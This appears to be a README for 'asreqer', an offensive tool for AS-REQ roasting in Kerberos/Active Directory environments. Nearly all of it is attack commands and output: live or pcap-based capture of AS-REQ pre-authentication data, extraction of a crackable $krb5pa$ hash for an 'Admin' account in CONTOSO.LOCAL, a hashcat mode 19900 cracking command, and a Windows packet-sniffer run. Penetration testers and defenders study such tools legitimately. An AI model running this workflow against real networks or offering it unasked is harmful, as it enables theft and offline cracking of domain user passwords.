# asreqer
asreq roasting

```sh
python3 asreqer.py live tun0
[*] Starting live capture on interface: tun0
[+] Found AS-REQ with pA-ENC-TIMESTAMP
    User (cname): Admin
    Realm:        CONTOSO.LOCAL
    EType:        18
    CipherText:   f4:07:3a:a7:ba:17:50:84:0f:7e [...snip...] 1:4f:de:7e:a5:51:b7:3f:2b:99:f4:4e:c9

=========================
$krb5pa$18$Admin$CONTOSO.LOCAL$f4073aa7ba175[... snip... ]b99f44ec9
=> Admin@CONTOSO.LOCAL-f4073a.krb5pa
=========================
```

crack with:

```sh
hashcat -m 19900 '$krb5pa$18$Admin$CONTOSO.LOCAL$f4073aa7ba175[... snip... ]b99f44ec9' <wordlist>
```

alternatively, collect packets with [sniffer](./sniffer/)

```sh
PS C:\Users\Admin\Desktop> .\sniffer.exe "Ethernet" 10 capture.pcap
[+] Using interface 'Ethernet' with IP 10.5.10.15
[+] Capturing for 10 seconds...
[+] Capture complete!
```

and parse with:

```sh
python3 asreqer.py file ../capture.pcap 
[*] Reading Kerberos packets from file: ../capture.pcap
[+] Found AS-REQ with pA-ENC-TIMESTAMP
    User (cname): Admin
    Realm:        CONTOSO.LOCAL
    EType:        18
    CipherText:   f4:07:3a:a7:ba:17:50:84:0f:7e [...snip...] 1:4f:de:7e:a5:51:b7:3f:2b:99:f4:4e:c9

=========================
$krb5pa$18$Admin$CONTOSO.LOCAL$f4073aa7ba175[... snip... ]b99f44ec9
=> Admin@CONTOSO.LOCAL-f4073a.krb5pa
=========================
```

## ref

[https://www.thehacker.recipes/ad/movement/kerberos/asreqroast](https://www.thehacker.recipes/ad/movement/kerberos/asreqroast)
[https://github.com/TheFlamingCrab/ticketsniffer](https://github.com/TheFlamingCrab/ticketsniffer)